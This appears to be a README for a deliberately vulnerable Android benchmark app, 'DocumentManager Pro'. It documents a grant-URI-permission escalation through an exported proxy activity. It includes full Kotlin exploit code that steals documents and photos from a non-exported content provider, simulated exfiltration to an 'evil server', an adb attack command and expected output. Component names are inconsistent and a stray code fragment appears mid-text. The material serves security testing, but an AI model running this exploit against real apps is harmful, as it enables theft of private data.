# oxo-android-ben75

## Application: DocumentManager Pro
**Package Name:** `com.documentmanager`  
**Vulnerability Type:** Grant URI Permission Escalation via Proxy Activity  
**Target SDK:** 34 (Android 14)

## Overview

DocumentManager Pro is a professional document management application that provides secure storage and sharing of business documents. The application features a comprehensive document organization system with enterprise-grade security controls and a vulnerable proxy activity pattern.

## Vulnerability Description

This application contains a **Grant URI Permission Escalation** vulnerability that allows unauthorized access to non-exported content providers through URI permission grant flags. The vulnerability exploits Android's URI permission system to bypass content provider export restrictions.

### Root Cause

The vulnerability exists in the `IntentProcessorActivity` which:
1. Is exported and accepts external intents
2. Processes embedded "workflow_intent" JSON parameters without proper validation
3. Forwards URI permission grant flags without sanitization
4. Allows persistent access to the non-exported `DocumentContentProvider`

### Technical Details

- **Vulnerable Component:** `com.documentmanager.IntentProcessorActivity`
- **Protected Resource:** `com.documentmanager.providers.DocumentContentProvider`  
- **Provider Configuration:** `exported="false"`, `grantUriPermissions="true"`
- **Attack Vector:** JSON workflow intent with `FLAG_GRANT_*_URI_PERMISSION` flags

## Application Features

### Core Functionality
- **Document Storage:** Secure content provider with sensitive business data
- **Document Management:** Professional document organization interface
- **Content Provider:** Non-exported provider with realistic sensitive documents
- **Workflow Processing:** Intent-based automation system (vulnerable proxy)

### Document Types Protected
- **Financial Reports:** Revenue, profit data, bank account information
- **Employee Records:** SSNs, salaries, security clearance levels  
- **Client Contracts:** Banking details, emergency contacts, legal agreements
- **Authentication Data:** Password hashes, session tokens, 2FA secrets

### Security Features
- Non-exported DocumentContentProvider with sensitive business data
- URI permission grant system for controlled access
- Professional business application interface
- Realistic enterprise document storage

## Building and Installation

### Prerequisites
- Android Studio Arctic Fox or later
- Android SDK 34
- Gradle 8.0+

### Install from APK
```bash
adb install apks/oxo-android-ben75.apk
```

### Build from Source
```bash
cd src/
./gradlew clean assembleDebug
```

### Installation
```bash
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

## Verification Commands

### Check Application Installation
```bash
adb shell pm list packages | grep com.documentmanager
```

### Launch Application
```bash
adb shell am start -n com.documentmanager/.MainActivity
```

### Verify Document Creation
```bash
adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"
```

### Test Direct Access to Content Provider (Should Fail)
```bash
adb shell content query --uri content://com.documentmanager.secure/documents
adb shell content query --uri content://com.documentmanager.secure/users
adb shell content query --uri content://com.documentmanager.secure/sessions
```

### Test Workflow Intent Processing
```bash
adb shell am start -n com.documentmanager/.IntentProcessorActivity
```

### Verify Provider Configuration
```bash
adb shell dumpsys package com.documentmanager | grep -A 10 "Provider"
```

## Application Structure

```
com.documentmanager/
├── MainActivity                    # Main dashboard interface
├── DocumentsActivity              # Document listing and management
├── ShareActivity                  # Document sharing interface  
├── SettingsActivity              # Application settings
├── IntentProcessorActivity       # Intent processing (vulnerable proxy)
└── providers/
    └── DocumentContentProvider   # Content provider (non-exported, sensitive data)
```

## Expected Behavior

1. Application launches with professional document management interface
2. Creates local business documents for demonstration purposes
3. Blocks direct access to DocumentContentProvider (non-exported)
4. Allows URI permission escalation through IntentProcessorActivity proxy
5. Enables persistent access to sensitive business documents via granted URI permissions
4. Processes intents through the proxy activity without proper validation
5. Allows embedded intents to bypass export restrictions

## Security Analysis

### Vulnerable Code Pattern
The `IntentProcessorActivity` processes external intents containing embedded JSON workflow intents with URI permission grant flags without proper validation, allowing persistent access to protected content providers.

### Attack Scenario
1. Malicious app sends intent to `IntentProcessorActivity`
2. Intent contains embedded "workflow_intent" JSON with URI permission flags
3. Proxy activity processes workflow intent and forwards permission flags
4. Non-exported `DocumentContentProvider` becomes accessible via URI permissions
5. Sensitive business documents can be accessed persistently without authorization

### Impact Assessment
- **Confidentiality:** High - Access to sensitive business documents and authentication data
- **Integrity:** Medium - Potential content provider data modification capabilities
- **Availability:** Low - No significant availability impact

## Notes

This vulnerability demonstrates a sophisticated Android security bypass technique that exploits the interaction between intent processing and URI permission grants. The vulnerability allows complete circumvention of content provider export restrictions through permission escalation.

The application presents as a legitimate business document management tool, making the vulnerability difficult to detect through surface-level inspection. This pattern represents a real-world attack vector that could be exploited to access sensitive business documents and authentication data in enterprise environments.
            }
        }
        
```

```xml
<!-- VULNERABLE: Exported proxy activity -->
<activity 
    android:name=".ProxyActivity"
    android:exported="true" />

<!-- VULNERABLE: Non-exported provider with grant permissions -->
<provider
    android:name=".SecureContentProvider"
    android:authorities="com.documentmanager.secure"
    android:exported="false"
    android:grantUriPermissions="true" />
```

**Malicious Exploit Code:**
```kotlin
// MALICIOUS: Exploit to gain URI permissions via proxy activity
class GrantUriExploit {
    fun exploitProxyActivity(context: Context) {
        // Step 1: Create embedded intent targeting attacker's receiver
        val embeddedIntent = Intent().apply {
            // Target attacker's activity to receive the URI permissions
            setClassName(context.packageName, "com.attacker.UriReceiver")
            
            // Set URI to victim's non-exported content provider
            data = Uri.parse("content://com.documentmanager.secure/")
            
            // ATTACK: Grant persistent URI permissions to attacker
            flags = Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION or
                   Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                   Intent.FLAG_GRANT_READ_URI_PERMISSION or
                   Intent.FLAG_GRANT_WRITE_URI_PERMISSION
        }
        
        // Step 2: Create proxy intent to victim's proxy activity
        val proxyIntent = Intent().apply {
            setClassName("com.documentmanager", "com.documentmanager.ProxyActivity")
            putExtra("extra_intent", embeddedIntent)
        }
        
        // Step 3: Launch attack - victim app grants URI permissions to attacker
        context.startActivity(proxyIntent)
    }
}

// MALICIOUS: Receiver that gets URI permissions and steals data
class UriReceiver : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Receive URI permissions granted by victim app
        val grantedUri = intent.data
        Log.d("URI_GRANTED", "Received URI permissions: $grantedUri")
        
        if (grantedUri != null) {
            stealSensitiveData(grantedUri)
        }
        finish()
    }
    
    private fun stealSensitiveData(baseUri: Uri) {
        try {
            // Access documents using granted prefix permissions
            val documentsUri = Uri.withAppendedPath(baseUri, "documents")
            contentResolver.query(documentsUri, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val filename = cursor.getString(cursor.getColumnIndex("filename"))
                    val content = cursor.getString(cursor.getColumnIndex("content"))
                    Log.d("STOLEN_DOCUMENT", "File: $filename, Content: $content")
                    
                    // Send stolen data to attacker server
                    sendToServer(filename, content)
                }
            }
            
            // Access photos using granted permissions
            val photosUri = Uri.withAppendedPath(baseUri, "photos")
            contentResolver.query(photosUri, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val filename = cursor.getString(cursor.getColumnIndex("filename"))
                    Log.d("STOLEN_PHOTO", "Photo: $filename")
                    
                    // Download actual photo file
                    val photoUri = Uri.withAppendedPath(photosUri, filename)
                    contentResolver.openInputStream(photoUri)?.use { inputStream ->
                        val photoData = inputStream.readBytes()
                        Log.d("PHOTO_STOLEN", "Photo data size: ${photoData.size} bytes")
                        sendPhotoToServer(filename, photoData)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("EXPLOIT_ERROR", "Failed to steal data", e)
        }
    }
    
    private fun sendToServer(filename: String, content: String) {
        // Simulate sending to attacker server
        Log.d("DATA_EXFILTRATED", "Sending $filename to evil server")
    }
    
    private fun sendPhotoToServer(filename: String, data: ByteArray) {
        // Simulate sending photo to attacker server
        Log.d("PHOTO_EXFILTRATED", "Uploading $filename (${data.size} bytes) to evil server")
    }
}
```
## Testing

```bash
# Install the vulnerable DocumentManager Pro app with proxy activity
adb install -r DocumentManager-Pro.apk

# Launch DocumentManager Pro to initialize sensitive data
adb shell am start -n com.documentmanager/.MainActivity

# Test direct access to non-exported provider (should fail)
adb shell content query --uri content://com.documentmanager.secure/documents

# Test proxy activity exploitation via ADB
adb shell am start \
  -n com.documentmanager/.ProxyActivity \
  -e extra_intent "intent:#Intent;component=com.attacker/.UriReceiver;scheme=content;host=com.documentmanager.secure;i.flags=0x00000043;end"

# Monitor for URI permission grants and data theft in logs
adb logcat -s URI_GRANTED:D STOLEN_DOCUMENT:D STOLEN_PHOTO:D DATA_EXFILTRATED:D PHOTO_EXFILTRATED:D

# Verify proxy activity is exported and accessible
adb shell dumpsys package com.documentmanager | grep -A 5 "ProxyActivity"

# Check content provider configuration
adb shell dumpsys package com.documentmanager | grep -A 10 "SecureContentProvider"

# Verify sensitive files exist in app directory
adb shell "run-as com.documentmanager ls -la /data/data/com.documentmanager/files/secure/"

# View actual sensitive document data
adb shell "run-as com.documentmanager cat /data/data/com.documentmanager/files/secure/confidential_report.pdf"
```

**Expected Results:**
```
Direct Provider Access (Blocked):
Error: SecurityException: Permission denial: opening provider com.documentmanager.SecureContentProvider 
from ProcessRecord{abc123 12345:com.android.shell/2000} (pid=12345, uid=2000) 
that is not exported from UID 10123

Proxy Activity Exploitation (Success):
URI_GRANTED: Received URI permissions: content://com.documentmanager.secure/
STOLEN_DOCUMENT: File: confidential_report.pdf, Content: base64encodeddata...
STOLEN_DOCUMENT: File: financial_data.xlsx, Content: spreadsheetdata...
STOLEN_PHOTO: Photo: private_photo1.jpg
PHOTO_STOLEN: Photo data size: 524288 bytes
DATA_EXFILTRATED: Sending confidential_report.pdf to evil server
PHOTO_EXFILTRATED: Uploading private_photo1.jpg (524288 bytes) to evil server

Security Analysis:
ProxyActivity: exported=true (VULNERABLE)
SecureContentProvider: exported=false, grantUriPermissions=true (VULNERABLE COMBINATION)

Exploit Test Output:
[+] Direct provider access blocked (expected)
[+] Proxy activity accessible and processing embedded intents
[+] URI permission grant successful via proxy pattern
[!] VULNERABILITY CONFIRMED: Non-exported provider accessible via URI grants
[+] Sensitive data extracted: documents, photos, financial data
[+] Persistent access maintained via FLAG_GRANT_PERSISTABLE_URI_PERMISSION
```

**Difficulty**: Medium

## Impact Assessment

- **Confidentiality**: Critical - Complete bypass of export restrictions enabling access to protected content providers
- **Integrity**: High - URI permission grants can include write access for data modification
- **Availability**: Medium - Potential for DoS through content provider abuse
- **OWASP Mobile Top 10**: M1 - Improper Platform Usage, M6 - Insecure Authorization, M10 - Extraneous Functionality
- **CWE**: CWE-926 (Improper Export of Android Application Components), CWE-863 (Incorrect Authorization), CWE-284 (Improper Access Control)

## Grant URI Permission Attack Scenarios

1. **Content Provider Access**: Bypass export restrictions to access non-exported content providers
2. **Data Theft**: Extract sensitive documents, photos, and personal information via content queries
3. **File System Access**: Use FileProvider paths to access app's internal files and databases
4. **Persistent Access**: Maintain long-term access through persistent URI permission grants
5. **Privilege Escalation**: Leverage victim app's permissions to access system resources

**Example Attack Flow:**
```bash
# 1. Target app has exported proxy activity that processes embedded intents
# 2. App has non-exported content provider with grantUriPermissions="true"
# 3. Attacker crafts malicious intent with URI permission grant flags
# 4. Proxy activity receives embedded intent and calls startActivity()
# 5. Android system grants URI permissions to attacker's component
# 6. Attacker gains persistent access to protected content provider
# 7. Sensitive data extracted via content queries and file operations
# 8. Complete bypass of export restrictions and access controls
```

This vulnerability demonstrates how proxy activity patterns can completely defeat Android's export restrictions, highlighting the danger of processing untrusted embedded Intent objects and the need for proper intent validation before launching activities.
